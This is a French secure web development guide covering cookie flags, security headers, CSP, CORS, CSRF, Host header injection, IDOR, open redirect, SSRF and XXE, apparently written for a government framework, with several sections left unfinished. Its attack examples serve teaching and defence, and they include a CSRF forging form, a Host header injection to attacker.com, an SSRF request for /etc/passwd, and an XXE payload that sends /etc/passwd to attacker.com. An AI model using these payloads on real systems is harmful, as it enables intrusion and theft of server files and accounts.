# Introduction

Ce document a pour objectif de lister les bonnes pratiques de sécurité et des recommandations en terme de développement d'une application web.
Celui-ci contient également une liste des vulnérabilités les plus rencontrées sur le Web. Il n'est malheureusement pas possible de traiter chaque cas particulier,
il ne s'agit donc pas d'un document exhaustif.

# Bonnes pratiques et tour d'horizon des vulnérabilités courantes

## Sécurité des cookies

Cette section porte sur les points observés concernant l'accessibilité, le transit et la sécurité des données ainsi que les recommandations faites en matière de
sécurité des services web.

- **Flag ``Secure`` pour les cookies**

Le flag ``Secure`` est à apposer sur des cookies et permet d’indiquer aux navigateurs des visiteurs que les cookies pour tel ou tel domaine ne peuvent transiter du
navigateur vers le serveur uniquement si la liaison est en HTTPS (sécurisée via SSL/TLS).

Autrement dit, dès lors qu’un site web est accessible en HTTPS et que ce protocole sécurisé est celui par défaut (tous accès en HTTP redirige automatiquement en HTTPS,
il est particulièrement recommandé d’appliquer le flag ``Secure`` sur l’intégralité des cookies.

- **Flag ``HttpOnly`` pour les cookies**

Il est à noter des flags HTTP peuvent être utilisés pour améliorer la sécurité des sessions utilisateurs ; notamment le flag ``HttpOnly`` au niveau des cookies
critiques, permettant d’amoindrir l’obtention des cookies par un attaquant via une vulnérabilité de type XSS, par exemple. Ce flag permet d’éviter au navigateur
d’interagir avec la valeur du cookie qui en est protégée.

### En-têtes (headers) de sécurité

De manière générale, il est conseillé d’appliquer des en-têtes de sécurité au niveau du serveur web, afin d’activer des mécanismes de sécurité intrinsèques aux
navigateurs actuels pour protéger les utilisateurs.

Les en-têtes suivants sont conseillés au niveau du serveur web :

### X-XSS-Protection

- Cet en-tête permet de forcer l’utilisation des moteurs anti-XSS propres aux navigateurs modernes.
- Exemple : _X-XSS-Protection: 1; mode=block_

### X-Content-Type-Options

- Permet d’empêcher de réaliser du type MIME-sniffing par rapport au content-type déclaré.
- Exemple : _X-Content-Type-Options: nosniff_

### X-Frame-Options

- Permet de protéger contre les attaques de type clickJacking et l’inclusion du site ciblé en frame / iframe sur un site tiers contrôlé par un assaillant.
- Exemple : _X-Frame-Options: deny or sameorigin_

### Strict-Transport-Security

- Force une connexion sécurisée (HTTPS) vers le serveur, ainsi que pour toutes les ressources également chargées dans le contexte de navigation du site (fichiers JS,
CSS, images, etc.).
- Exemple : _Strict-Transport-Security: max-age=16070400; includeSubDomains_

### Flag SameSite pour les cookies

Un nouveau flag de sécurité destiné aux cookies existe depuis peu, le flag ``SameSite``. Ce flag permet d’indiquer au navigateur de ne faire transiter les cookies à
destination d’un serveur, uniquement si le parcoure de navigation n’est effectué que dans le contexte du domaine en tant que tel.

Via ce nouveau flag, les attaques CSRF sont mitigées nativement.

La présence de ce flag peut néanmoins impacter l’expérience utilisateur, imposant une reconnexion à chaque nouvel accès direct au domaine par exemple.

### Exemple de configuration présente dans le fichier ``config/default.json`` de **applitutoriel-js** :

Cette configuration devra être adaptée pour l'environnement de **PRODUCTION** 


``````````````
"cookie": {
    //"domain": null,
    //"path": null,
    "httpOnly": true,
    //"secure": true,
    "defaultDuration": 3600 // in second
    //"alwaysSetCookie": false
  },
``````````````

## Content Security Policy (CSP)

Une ``Content Security Policy`` (CSP) (ou politique de sécurité du contenu) permet d'améliorer la sécurité des sites web en permettant de détecter et mitiger certains
types d'attaques, dont les Cross Site Scripting (XSS) et les injections de contenu. Ces attaques peuvent être utilisées dans divers buts, comme le vol de données,
le défacement de site ou la diffusion de malware.

### Exemple 1
Pour un site dont tout le contenu est fourni par le site lui-même (sans inclure les sous-domaines) en HTTPS et qui n'utilise pas le referer des navigateurs :

_Content-Security-Policy: default-src 'self'; upgrade-insecure-requests; referrer no-referrer_

### Exemple 2
Pour un site dont tout le contenu est fourni par le site lui-même ou par les sous-domaines de source-sure.example.net (qui peut être un autre site) :

_Content-Security-Policy: default-src 'self' *.source-sure.example.net_

### Exemple 3
Pour un site dont les images peuvent venir de n'importe où, les musiques et vidéos de toto.local ou tata.local, les scripts par scripts.local :

_Content-Security-Policy: default-src 'self'; img-src *; media-src toto.local tata.local; script-src scripts.local_

Ici, les contenus doivent par défaut venir de la même origine que la page avec les exceptions précédemment décrites. Cela peut permettre aux utilisateurs d'afficher des images quelconques, mais de ne faire confiance qu'à certains domaines pour les musiques, vidéos et scripts.

### Exemple 4
Pour un site dont les données sont au moins privées et pour lequel toutes les données devraient être transmises en HTTPS depuis un domaine précis :

_Content-Security-Policy: default-src https://confidentiel.example.net_

Cette politique force l'utilisation de HTTPS et exclus tout usage de contenu ne venant pas de https://confidentiel.example.net.

### Example 5
Pour un webmail qui permet d'afficher des mails incluant de l'HTML, des images provenant de n'importe où mais pas de Javascript ou autres :

_Content-Security-Policy: default-src 'self'; img-src *; child-src: *_

### Exemple de configuration présente dans le fichier ``config/default.json`` de **applitutoriel-js** :

Cette configuration devra être adaptée pour l'environnement de **PRODUCTION** 

``````````````
"security": {
    "enabled": true,
    "hpp": true,
    "ieNoOpen": true,
    "noSniff": true,
    "csp": {
      "enabled": true,
      "connectSrc": [
        "'self'"
      ],
      "scriptSrc": [
        "'self'",
        "'unsafe-inline'",
        "'unsafe-eval'"
      ],
      "styleSrc": [
        "'self'",
        "'unsafe-inline'"
      ],
      "fontSrc": [
        "'self'"
      ],
      "imgSrc": [
        "'self'"
      ],
      "formAction": [
        "'self'"
      ],
      "reportOnly": false,
      "setAllHeaders": true,
      "disableAndroid": false
    },
    "frameguard": {
      "enabled": true
      /*,"action": "sameorigin",*/
      /*"domain": ""*/
    },
    "xss": {
      "enabled": true,
      "setOnOldIE": true
    },
``````````````

## Cross-Origin Resource Sharing (CORS)

Le ``Cross-Origin Resource Sharing `` (CORS) est un mécanisme qui permet aux navigateurs Web d'effectuer des requêtes inter-domaines à l'aide de l'API ``XMLHttpRequest``
de manière contrôlée. Ces demandes de type ``cross-origin`` ont un en-tête (header) ``Origin``, qui identifie le domaine à l'origine de la demande. Il défini le 
protocole à utiliser entre un navigateur Web et un serveur pour déterminer si la demande est autorisée.

Il existe un certain nombre d’en-têtes HTTP liés aux requêtes de type CORS, mais les deux en-têtes de réponse suivants sont les plus importants pour la sécurité
des données :

- ``Access-Control-Allow-Origin`` : spécifie quels domaines peuvent accéder aux ressources d’un domaine. Par exemple, si domain1.diplomatie.gouv.fr souhaite accéder
aux ressources de domain2.diplomatie.gouv.fr, les développeurs peuvent utiliser cet en-tête pour accorder en toute sécurité à domain1.diplomatie.gouv.fr un accès 
aux ressources de domain2.diplomatie.gouv.fr.
- ``Access-Control-Allow-Credentials`` : spécifie si le navigateur envoie ou non des cookies avec la demande. Les cookies ne seront envoyés que si l'en-tête
allow-credentials est défini sur true.

L’une des erreurs de configuration CORS la plus courante est l’utilisation incorrecte de caractères génériques tels que ``*`` sous lesquels les domaines sont autorisés
à demander des ressources. Ceci est généralement défini par défaut, ce qui signifie que tout domaine peut accéder aux ressources du site.

Par exemple, considérons la requête ci-dessous:

```````````````
GET /api/v1/infos_utilisateurs HTTP/1.1
Host: diplomatie.gouv.fr
Origin: diplomatie.gouv.fr
```````````````

Lorsque cette requête est transmise au serveur, on obtient une réponse contenant deux en-tête ``Access-Control-Allow-Origin`` et ``Access-Control-Allow-Credentials``

```````````````
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```````````````

Dans cet exemple, l'en-tête est configurée avec un caractère générique ``*``. Cela signifie que n'importe quel domaine peut accéder aux ressources. Le paramètrage 
du header ``Access-Control-Allow-Credentials`` à ``true`` augmente d'autant plus la criticité, puisque cela autorise la requête à utiliser le cookie de session de
l'utilisateur. 

### Recommandation(s)

Pour mettre en œuvre une requête CORS de manière sécurisée, il est important de paramétrer une liste de domaines autorisés avec ``Access-Control-Allow-Origin`` et de ne
pas le valuer sur ``*``.

### Ressource(s)

- https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)

## Cross-Site Request Forgery (CSRF)

Les ``Cross-Site Request Forgery`` (CSRF) sont des attaques qui forcent les utilisateurs à exécuter des actions non désirées dans une application sur laquelle
ils sont authentifiés. Avec un peu d'ingénierie sociale, par exemple en envoyant un lien par courriel ou messagerie instantanée, un attaquant peut forcer les
utilisateurs d'une application web à exécuter les actions qu'il veut.

Selon le niveau du compte concerné (utiliasteur standard ou administrateur...) l'impact peut-être plus ou moins élevé.

Prenons la requête **POST** suivante :

``````````
POST /changer_motdepasse HTTP/1.1
Host: test.diplomatie.gouv.fr

nouveau_mdp=Admin2109!&verif_nouveau_mdp=Admin2109!

``````````

Cette requête a pour objectif de modifier le mot de passe de l'utilisateur courant. Cependant, aucun jeton anti-CSRF n'est présent dans la requête.
Un attaquant peut donc tout à fait héberger un formulaire similaire sur son propre site et via une attaque de phishing, inviter la victime à cliquer sur un lien
spécifique :

``````````
<form action="https://test.diplomatie.gouv.fr" method="POST">
<input type="hidden" name="nouveau_mdp" value="NouveauMDP"/>
<input type="hidden" name="verif_nouveau_mdp" value="NouveauMDP"/>
<input type="submit" value="Cliquez-ici"/>
</form>
``````````

Puisque la victime est authentifiée, l'attaquant peut utiliser son cookie de session au travers de son formulaire, pour modifier le mot de passe courant.

Avec l'ajout d'un token CSRF, ce type d'attaque n'est plus possible, car un jeton doit être :

- A usage unique (un nouveau token à chaque envoi du formulaire)
- Non-prédictible ;

Exemple d'une requête qui implémente correctement une sécurité (un jeton) anti-CSRF :

``````````
POST /changer_motdepasse HTTP/1.1
Host: test.diplomatie.gouv.fr

nouveau_mdp=Admin2109!&verif_nouveau_mdp=Admin2109!&csrf=1JhnE74oPqNWaPLLq410

``````````

**Cette problématique est traitée par l'intermédiaire d'un middleware _Express_ activé par défaut et la couche d'appel aux services _Hornet superagent_**

### Recommandation(s)

Le principe de protection est de s’assurer que l’application requiert une authentification qui n’est pas utilisée automatiquement par le navigateur.
Cela consiste typiquement en l’ajout d’un élément aléatoire à la validation de formulaire de telle sorte qu’une requête ne sera considérée comme légitime que si
elle contient cet élément aléatoire. En effet, les attaques CSRF ne sont possibles que si les requêtes sont prédictibles.

Voici deux exemples :

- envoyer avec chaque formulaire une valeur aléatoire et limitée dans le temps. Le serveur doit vérifier dans une table d’états que cette valeur est bien renvoyée
dans la requête de validation du formulaire ;
- créer un condensé (hash) avec une valeur secrète, une action définie (requête), l’identificateur de session et un horodatage, qui est envoyé avec chaque formulaire
à l’utilisateur. Ce dernier doit renvoyer cette valeur lorsqu’il valide un formulaire, qui est recalculée par le serveur et vérifiée.

La première méthode nécessite plus de mémoire (table d’états) tandis que la deuxième nécessite du temps de calcul supplémentaire de la part du serveur.
D’autres implémentations similaires sont envisageables. Un élément aléatoire unique par requête peut être préférable à un élément aléatoire unique par session
(s’il est compromis, l’impact sera limité à la seule requête).

### Ressource(s)

- https://www.owasp.org/index.php/4.7.5_Tester_les_CSRF_(OTG-SESS-005)

## Cross-Site Scripting (XSS)

Les failles Cross-Site Scripting (également appelées XSS) sont une vulnérabilité Web qui permet à un attaquant de compromettre les interactions des utilisateurs avec
une application vulnérable. Les vulnérabilités de script permettent généralement à un attaquant de se faire passer pour un utilisateur victime, d'effectuer toutes les
actions que l'utilisateur est capable de réaliser et d'accéder à ses données. Si l'utilisateur victime dispose d'un accès privilégié dans l'application, l'attaquant
pourrait alors avoir le contrôle total sur toutes les fonctionnalités et les données de l'application.

### Reflected XSS

### Stored XSS

### Recommandation(s)

Les failles XSS peuvent être mitigées de différentes façon, il convient de les éradiquer sur un applicatif car elles ouvrent la porte à de nombreuses possibilités
pour un attaquant tel que le vol de cookie de session, la redirection des utilisateurs, le bypass anti-CSRF... :

- Ne pas insérer d'entrée utilisateur sans une phase de de contrôle et d'épuration (sanitization)

- Html escape/encode : l'échappement HTML vise à empêcher l'exploitation des situations où l'attaquant est en capacité d'injecter du code arbitraire dans du code HTML
existant. Parmi les techniques d'échappement HTML : Utilisation des fonctions "htmlentities" et "htmlspecialchars" en PHP ou "escapeHtml" et "htmlEncode" en Java.

- CSS escape/encode : l'échappement CSS vise à empêcher l'exploitation des situations où l'attaquant est en capacité d'injecter du code arbitraire dans du code CSS
existant.

- URL escape/encode : l'échappement URL vise à empêcher l'exploitation des situations où l'attaquant est en capacité d'injecter du code arbitraire dans l'URL du
navigateur (paramètre GET).

- Appliquer un transtypage ou une expression régulière si le format des données entrantes est correctement défini. Par exemple un code produit numérique passé en
variable GET peut être « transtypé » coté serveur en tant que variable de type "int". On s'assurera ainsi de la validité du format attendu.

- Centraliser tous les traitements de contrôle et d'épuration des données entrantes (GET, POST, Cookies) au travers de fonctions et méthodes communes.

- Utiliser un framework efficace ou enrichir celui existant pour l'épuration des données en entrée et en sortie plutôt que de définir des fonctions d'épuration
artisanales.  L'utilisation d'un framework reconnu sera toujours plus efficace qu'une fonction moins éprouvée.

- Raisonner par liste blanche pour le nettoyage des données entrantes quand le métier le permet plutôt que par liste noire. En effet, une même syntaxe d'injection
peut se réécrire d’innombrables façons (obfuscation).

- Implémentation d'un WAF (Web-application Firewall). La présence d'un WAF permet de centraliser la phase d'épuration sur un équipement en amont afin de réduire les
traitements de contrôle au niveau du serveur. Toutefois, il est important de mettre en place un principe de défense en profondeur en multipliant les contrôles et les vérifications et de ne pas déléguer toute la sécurité à l'unique WAF en place (techniques de bypass WAF).

- Tripler les contrôles cotés serveur, client et backend. Il est nécessaire de s'assurer du bon format des données au plus tôt dans la chaine de traitement
(coté client via du JavaScript), de leur traitement correct côté serveur et de leur stockage effectif coté backend.

- Afin d'opérer un principe de défense en profondeur, il est conseillé d'utiliser plusieurs de ces recommandations. L'encodage/échappement des données entrantes
est généralement une condition nécessaire est suffisante à la mitigation des XSS.


### Ressource(s)

- https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
- https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

## File Upload

En cours...

### Recommandation(s)

### Ressource(s)

## Host Header Injection

Il est courant qu'un même serveur Web héberge plusieurs sites Web ou applications Web sur la même adresse IP, c'est pourquoi l'en-tête ``Host`` existe.

L'en-tête ``Host`` spécifie quel site Web ou quelle application Web doit traiter une requête HTTP entrante. Le serveur Web utilise la valeur de cet en-tête pour
envoyer la demande au site Web. Chaque application Web hébergée sur la même adresse IP est généralement appelée un hôte virtuel (_VHOST_)

La plupart des serveurs Web sont configurés pour transmettre l'en-tête d'hôte non reconnu au premier hôte virtuel de la liste. Par conséquent, il est possible
d’envoyer des demandes avec des en-têtes ``Host`` arbitraires.

Une autre façon de passer des en-têtes d’hôte arbitraires consiste à utiliser l’en-tête ``X-Forwarded-Host``. Dans certaines configurations, cet en-tête réécrira la
valeur de l'en-tête ``Host``.

Ce type d'attaque a un intérêt multiple pour un attaquant selon les cas, notamment :

- Attaque sur le processus de réinitialisation de mot de passe ;
- Accès à des vhosts internes ;

Exemple avec la requête **POST** suivante, permettant de demander un nouveau mot de passe et de recevoir un email de réinitialisation :

````````````````
POST /reset_motdepasse HTTP/1.1
Host: test.diplomatie.gouv.fr

email=test@diplomatie.gouv.fr&csrf=Hbsh42On44QwSEncHa9
````````````````

En cas de mauvaise configuration, un attaquant va tenter de modifier le header ``Host`` ou bien d'ajouter un header ``X-Forwarded-Host`` avec une valeur arbitraire :

````````````````
POST /reset_motdepasse HTTP/1.1
Host: test.diplomatie.gouv.fr
X-Forwarded-Host: attacker.com

email=test@diplomatie.gouv.fr&csrf=Hbsh42On44QwSEncHa9
````````````````

La victime va alors recevoir un email, contenant un lien de réinitialisation sous ce format :

````
https://attacker.com/reinitialisation_mdp?token=336573305a7f7457e017c6b450bbcf31
````

Bien que l'attaquant n'ai pas la main directement sur la messagerie de la victime (et n'a donc pas accès au token de réinitialisation), de nombreuses personnes recevant
cet email peuvent être ammenées à cliquer sur le lien de réinitialisation, en pensant être victime d'un piratage et vont ainsi réinitialiser leur mot de passe, directement
sur le site de l'attaquant.

**Cette configuration étant traitée au niveau d'_Apache_, il est nécessaire de se rapprocher des personnes de la production**

### Recommandation(s)

Il est recommandé de ne jamais faire confiance dans l’en-tête ``Host``. Si vous devez utiliser l’en-tête ``Host`` comme mécanisme au sein d'une application web,
il est vivement conseillé d’utiliser une liste blanche des noms d’hôtes autorisés.

Ce paramétrage peut être réalisé dans Apache ou bien dans un fichier ``.htaccess`` ou ``httpd.conf``.

Ces règles fonctionnent sur la base d'une expression régulière qui vérifie la valeur de l'en-tête de l'hôte. Si la valeur ne correspond pas au modèle d'expression
régulière, une redirection est effectuée vers une URL prédéfinie.

```````````
RewriteEngine On
RewriteCond %{HTTP_HOST} !^([a-zA-Z0-9-_]{1,20}.){0,3}diplomatie.gouv.fr$
RewriteRule ^(.*)$ https://diplomatie.gouv.fr/ [R=301,L]
```````````

### Ressource(s)

- http://niiconsulting.com/checkmate/2018/10/manipulating-host-headers-not-anymore
- https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks

## Injections SQL (SQLi)

En cours...

### Recommandation(s)

### Ressource(s)

## Insecure Direct Object Reference (IDOR)

Les vulnérabilités ``Insecure Direct Object Reference`` (IDOR) sont des attaques courantes, triviale à exploiter et peuvent s'avérer relativement dangereuses et
impactantes dans certains cas. De la modification de données à de la suppression de comptes, les exploitations sont diverses.

Prenons l'exemple de la requête ``DELETE`` suivante :

````````````````````
DELETE /allor/services/demandes/delete/6 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
x-csrf-token: frm0iumlp3
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Cookie: NODESESSIONID=-KpdANw6FfdeZpJdWKcdWFygCHvyFFSN.js1
Connection: close
````````````````````

Dans le chemin  d'API ``/allor/services/demandes/delete/6`` le chiffre ``6`` correspond à une demande ayant l'ID ``6`` au sein de l'application. Une IDOR va alors
consister à simplement itérer ce chiffre, permettant à un attaquant de supprimer un profil qui n'est pas le sien.

### Recommandation(s)

La protection contre les attaques de type IDOR peut se faire de différentes manières :

- Dans la requête ``DELETE`` présentée ci-dessus, l'ID``6`` est relativement simple et permet à un attaquant de prédire les autres ID existants. L'une des protections
contre les IDOR, consiste à utiliser un identifiant unique et non prédictable, tel que le format UUID / GUIDv4 qui se présente sous la forme 
``c0fabe4f-6286-4e48-9d57-b1f9ce1264e1``. En utilisant un identifiant complexe, il n'est pas possible pour un attaquant de prédire les IDs suivants et de rendre
toute tentative de bruteforce inutile.

- Une autre approche consiste à limiter les accès demandés en vérifiant dans la requête que l’objet appelé est légitimement accessible par l’utilisateur.
Cela implique d’avoir une table de correspondance des droits entre les objets et les utilisateurs mais, à l’inverse de la précédente méthode, si le mécanisme est
bien implémenté, il n’est pas possible de « bruteforcer » le site en envoyant des millions de requêtes jusqu’à trouver un objet. L’association cookie/session/droits
de l’utilisateur liés à la session est donc une méthode de sécurisation pertinente.

### Ressource(s)

- https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.md

## Open Redirect

Les attaques de type ``Open Redirect`` sont souvent considérées comme "Faible", pourtant, elles sont bien souvent le point de départ pour une attaque de Phishing
et peuvent parfois même permettre, dans certains cas, la prise de contrôle d'un compte d'une victime (``Account Takeover``).

Prenons par exemple une page de connexion. Après authentification, on souhaite que l'utilisateur soit redirigé vers ``/accueil``

````
https://test.diplomatie.gouv.fr/connexion?redirect_url=https://test.diplomatie.gouv.fr/accueil
````

Le paramètre **GET** ``redirect_url`` est ainsi défini pour rediriger vers le domaine ``https://test.diplomatie.gouv.fr/accueil`` après authentification.

Une attaque de type ``Open Redirect`` consiste à utiliser un paramètre de redirection sur un site légitime (_redirect, redirect\_url, follow..._) pour forcer la
redirection de l'utiisateur vers un domaine externe, contrôlé par un attaquant.

Ce qui pourrait donner l'URL suivante :

````
https://test.diplomatie.gouv.fr/connexion?redirect_url=https://test-diplomatiegouv.fr/accueil
````

Cette vulnérabilité permet de nombreuses attaque de phishing, notamment parce-que la victime ne se rend pas compte de la redirection et que le site d'origine sur
lequel elle s'est rendu est bien "légitime".

Une attaque de type ``Open Redirect`` est d'autant plus dangereuse lorsque celle-ci permet à un attaquant d'obtenir des informations d'identification contenu
dans l'en-tête ``Referer``.

### Recommandation(s)

Pour éviter ce type de vulnérabilité :

- Évitez d'utiliser des redirections et des transferts via un paramètre **GET** ou **POST**
- Si l'utilisation d'un paramètre de redirection est obligatoire, il est nécessaire de contrôler que le domaine indiqué correspond à celui qui est attendu par 
l'application web

### Ressource(s)

- https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md

## Server-Side Request Forgery (SSRF)

La vulnérabilité ``Server Side Request Forgery`` (SSRF) est une vulnérabilité Web permettant de lire des fichiers en local ou d'accéder au réseau interne,
depuis le réseau externe.

Les _SSRF_ sont souvent présentes sur des services en ligne permettant un appel vers des URLs externes (importation de fichier, modification de l'image de profil...).
Par manque de contrôle des protocoles autorisés et des URLs interrogées, un attaquant peut ainsi détourner l'utilisation initialement prévue pour accéder à des 
ressources internes sur le serveur local.

Prenons par exemple le code NodeJS suivant :

`````````
var http = require('http');
var needle = require('needle');
var express = require('express');
var app = express();
var commandLineArgs = require('command-line-args');

var cli = [
  { name: 'port', alias: 'p', type: Number, defaultOption:80 }
]
var options = commandLineArgs(cli)

app.get('/', function(request, response){
    var params = request.params;
    var url = request.query['url'];
    if (request.query['mime'] == 'plain'){
	var mime = 'plain';
    } else {
	var mime = 'html';
};
`````````

Cet exemple prend en entrée une URL (en paramètre **GET**) et récupère la page associée.

Le code présenté ci-dessus, permet donc à un attaquant d'utiliser divers protocoles, dont voici les principaux :

- file://
- http://
- https://
- gopher://

Un attaquant tentera ainsi de forger la requête suivante vers le serveur : ``https://test.diplomatie.gouv.fr?url=file:///etc/passwd`` étant donné qu'aucun contrôle
n'est présent pour vérifier le protocole utilisé (ici _file://_), cette requête permet ainsi d'accéder au fichier local du serveur ``/etc/passwd``.

### Recommandation(s)

Le moyen le plus efficace d'éviter les ``Server-Side Request Forgery`` consiste à ajouter à la liste blanche le nom DNS ou l'adresse IP auxquels votre
application doit accéder. Si une approche de liste blanche ne vous convient pas et que vous devez vous appuyer sur une liste noire, il est important de valider
correctement les entrées de l'utilisateur. Par exemple, n'autorisez pas les demandes adressées à des adresses IP privées (non routables).

Toutefois, dans le cas d’une liste noire, les mesures correctives à adopter varient d’une application à l’autre. En d'autres termes, il n'existe pas de solution
universelle à SSRF, car celle-ci dépend fortement de la fonctionnalité de l'application et des exigences de l'entreprise.

- Désactiver les schémas d'URL non utilisés

Si votre application utilise uniquement HTTP ou HTTPS pour effectuer des demandes, n'autorisez que ces schémas d'URL. Si vous désactivez les schémas d'URL non
utilisés, l'attaquant ne pourra plus utiliser l'application Web pour formuler des requêtes utilisant des schémas potentiellement dangereux,
tels que _file:///_, _dict://_, _ftp://_ ou encore _gopher://_

### Ressource(s)

- https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability


## Server-Side Template Injection (SSTI)

En cours...

### Recommandation(s)

### Ressource(s)

## XML External Entities (XXE)

Les attaques de type ``XML External Entities`` (XXE) consistent à utiliser l'appel d'une entité externe pour effectuer des actions malveillantes à l'encontre du serveur.

En effet, par défaut, de nombreux processeurs XML permettent de spécifier une entité externe : une URL déréférencée et évaluée lors du traitement XML. Si l'analyseur
n'est pas configuré autrement, les entités externes le forcent à accéder à la ressource spécifiée par l'URL (fichier local ou distant).

Ce comportement expose l'application aux attaques XXE, qui peuvent être utilisées pour causer des dénis de service sur le système, pour obtenir un accès non-autorisé
à des fichiers sur la machine locale, pour scanner des machines à l'interieur du réseau (SSRF) et voir même exécuter du code arbitraire dans certains cas.

Exemple d'une requête **POST** envoyée vers un service SOAP :

````````````````````
POST /router.php HTTP/1.1
Host: test.diplomatie.gouv.fr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 305

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE SOAP-ENV:Envelope [
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
%dtd;
]>
<SOAP-ENV:Envelope>
  <SOAP-ENV:Header>
    <foo/>
  </SOAP-ENV:Envelope>
`````````````````````

Cette requête XML spécifie une DTD externe hébergée sur un serveur externe ``attacker.com``.

Le contenu de la DTD externe ``xxe.dtd`` est le suivant :

`````````````````````
<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://attacker.com/%xxe;/'>">
%c;
%rrr;
`````````````````````

### Détails du fonctionnement de l'attaque

L'attaque fonctionne en trois étapes :

- La première étape consiste donc à envoyer une requête **POST** au serveur victime, en spécifiant une en-tête XML ``<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">``
Cette en-tête XML indique que l'on fait appel à une DTD externe.

-  Le serveur reçoit la requête **POST** et parse le XML. En traitant le XML, le serveur detecte qu'un DTD externe est utilisé et va donc lire le contenu du fichier
dtd ``xxe.dtd`` qui est hébergé sur le serveur de l'attaquant

- La DTD externe ``xxe.dtd`` demande alors au serveur "victime" d'aller lire le contenu du fichier ``/etc/passwd`` puis d'envoyer le résultat encodé en base64 vers
le serveur ``attacker.com``

### Recommandation(s)

Pour prévenir des attaques de type XXE, plusieurs recommandations, notamment :

- Utiliser des formats de données moins complexes tels que JSON et éviter la sérialisation des données sensibles.
- Autant que possible, Désactiver le traitement des entités externes XML et des DTD dans tous les moteur XML de l’application
- Corriger ou mettre à niveau tous les moteurs et bibliothèques XML utilisés par l'application ou sur le système d'exploitation sous-jacent. Utiliser des vérificateurs
de dépendance. Mettre à jour SOAP vers SOAP 1.2 ou supérieur.
- Implémenter une validation, un filtrage ou un nettoyage des entrées côté serveur positives ("liste blanche") pour empêcher les données hostiles dans les documents
XML, les en-têtes ou les nœuds.
- Vérifier que la fonctionnalité de téléchargement de fichier XML ou XSL valide le XML entrant à l'aide de la validation XSD ou similaire.

### Ressources(s)

- https://pentestmag.com/exploiting-the-entity-xme-xml-external-entity-injection/

# Ressources externes

- https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project
- https://pentester.land/list-of-bug-bounty-writeups.html
- https://github.com/ngalongc/bug-bounty-reference